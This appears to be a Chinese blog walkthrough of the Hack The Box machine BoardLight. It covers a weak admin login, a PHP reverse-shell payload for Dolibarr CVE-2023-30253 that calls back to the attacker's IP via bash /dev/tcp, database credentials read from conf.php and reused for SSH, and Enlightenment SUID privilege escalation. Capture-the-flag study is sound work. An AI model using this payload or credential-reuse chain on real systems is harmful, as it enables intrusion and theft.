---
weight: 999
title: "BoardLight"
description: ""
icon: "article"
date: "2025-05-31T20:00:16+08:00"
lastmod: "2025-05-31T20:00:16+08:00"
draft: false
toc: true
---

# 信息搜集
ip：10.10.11.11
nmap：
```bash
nmap -T4 -A -v ip
```
![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531201709370.png)

访问80端口
除了一个邮箱域名没有别的发现

![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531202117912.png)

将ip和域名添加到hosts文件里，爆破一下子域名
```bash
gobuster vhost -u http://board.htb --append-domain -w C:\Users\Administrator\Desktop\Dictionary-Of-Pentesting-master\Subdomain\wydomain_top3000.txt
```
![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531201140133.png)

将这个也添加到hosts文件
访问发现是登录界面，尝试弱口令
>admin:admin

搜索dolibarr 17.0.0的漏洞，找到CVE-2023-30253
https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253
```php
<?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.33/1001 0>&1'"); ?>
```
反弹成功

![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531202144847.png)

生成交互式shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
搜索配置文件
```bash
find / -name conf.php 2>/dev/null
```
>/var/www/html/crm.board.htb/htdocs/conf/conf.php

打开找到数据库账号密码
>$dolibarr_main_db_user='dolibarrowner';
  $dolibarr_main_db_pass='serverfun2$2023!!';

翻找数据库无内容。home目录下存在larissa用户，尝试ssh，密码使用数据库密码
```bash
ssh larissa@10.10.11.11
```

![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531202201878.png)

之后提权，先sudo -l无效，查找suid文件
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
发现使用Enlightenment，有CVE-2022-37706

![](https://gitee.com/inklong/blog-pic/raw/master/images/20250531202403943.png)

下载exp，开个python服务
```bash
python -m http.server 80
```
之后给执行权限，运行即可提权
![[Pasted image 20240726115017.png]]
或者使用LinPEAS辅助查找提权    